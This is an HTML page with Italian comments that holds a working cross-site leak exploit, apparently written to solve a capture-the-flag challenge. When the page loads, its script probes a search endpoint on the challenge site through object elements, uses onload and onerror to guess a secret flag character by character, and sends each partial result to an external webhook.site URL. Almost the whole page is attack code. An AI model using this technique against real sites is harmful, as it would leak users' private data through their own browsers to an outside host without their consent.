<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Test</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Caratteri validi
        let currentFlag = ''; // Flag trovata

        const leak = async (url) => {
            return new Promise((resolve) => {
                let s = document.createElement('object');
                s.data = url;
                s.onload = (e) => {
                    e.target.remove();
                    return resolve(0); // Risorsa accessibile (status 200)
                };
                s.onerror = (e) => {
                    e.target.remove();
                    return resolve(1); // Risorsa non accessibile (status 404)
                };
                document.body.appendChild(s);
            });
        };

        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                const response = await fetch(urlWithParams, { method: 'GET' });
                if (!response.ok) {
                    console.error('Errore durante l\'invio del log:', response.statusText);
                } else {
                    console.log('Log inviato con successo');
                }
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        const guessFlag = async () => {
            for (let i = 0; i < 30; i++) { // Limite massimo di lunghezza per evitare loop infiniti
                let foundChar = false;

                for (let char of validChars) {
                    const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`;
                    const result = await leak(url);

                    if (result === 0) { // Carattere trovato
                        currentFlag += char;
                        document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
                        console.log(`Flag parziale trovata: ${currentFlag}`);
                        await logResult(`Flag parziale trovata: ${currentFlag}`);
                        foundChar = true;
                        break; // Passa al carattere successivo
                    }
                }

                if (!foundChar) { // Se nessun carattere Ã¨ stato trovato, termina la ricerca
                    console.log('Flag completa trovata:', currentFlag);
                    await logResult(`Flag completa trovata: ${currentFlag}`);
                    break;
                }
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            guessFlag();
        });
    </script>
</body>
</html>
